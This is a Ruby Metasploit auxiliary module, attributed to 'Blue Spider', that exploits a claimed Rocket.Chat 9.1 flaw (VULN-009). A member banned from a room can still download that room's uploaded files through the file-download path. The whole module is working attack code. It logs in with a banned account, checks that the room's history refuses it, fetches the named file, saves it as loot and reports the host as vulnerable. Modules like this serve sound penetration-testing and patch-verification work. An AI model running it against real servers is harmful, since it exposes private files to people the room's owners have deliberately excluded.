class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 room-ban bypass on the file-download path (VULN-009)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. A member banned from a room
          is refused by the room's history and streams, but the file-download route
          authorises against the banned subscription and serves the room's uploads to
          them. This module signs in with the banned account the operator names,
          confirms the room's history still refuses it, then downloads the file the
          operator names and keeps it as loot. The operator supplies the account, the
          room id and the file's id and name; the module creates nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/file-upload']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('ROOMID', [true, 'The id of a room the account is banned from', '6b05e0d5e7422a44df31e2bf']),
      OptString.new('FILEID', [true, 'The id of a file uploaded in that room', '6b05e159e7422a44df31e300']),
      OptString.new('FILENAME', [true, 'That file\'s name', 'quarterly-b1.txt']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = fetch_file
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = history_refused? && res.code == 200 && !res.body.to_s.empty? && api_error(res).empty?
    fail_with(Failure::NotVulnerable, 'VULN-009: the attack did not land') unless hit

    print_good("#{peer} - VULN-009: exploited")
    print_good("#{peer} - the banned account downloaded #{datastore['FILENAME']} (#{res.body.to_s.bytesize} bytes) from a room whose history refuses it")
    print_line(res.body.to_s[0, 2048])
    path = store_loot('blue_spider.vuln_009', 'text/plain', rhost, res.body.to_s, 'vuln_009.txt', 'VULN-009 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-009 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # Two requests, because one proves nothing on its own: the room's history
  # has to refuse this account (the ban is really in force) and the same
  # account has to be handed the room's file anyway (the ban is not enforced
  # on the download path). A patched build refuses both.
  def history_refused?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/groups.history'),
      'vars_get' => { 'roomId' => datastore['ROOMID'], 'count' => '5' },
      'headers' => auth_headers
    })
    return false unless res

    refused = res.code != 200 || parse_json(res)['success'] == false
    vprint_status("#{peer} - groups.history for the banned account: HTTP #{res.code} " \
                  "#{api_error(res)}")
    refused
  end

  def fetch_file
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, datastore['FILEID'], datastore['FILENAME']),
      'headers' => auth_headers
    })
  end

  def auth_headers
    { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id }
  end
end
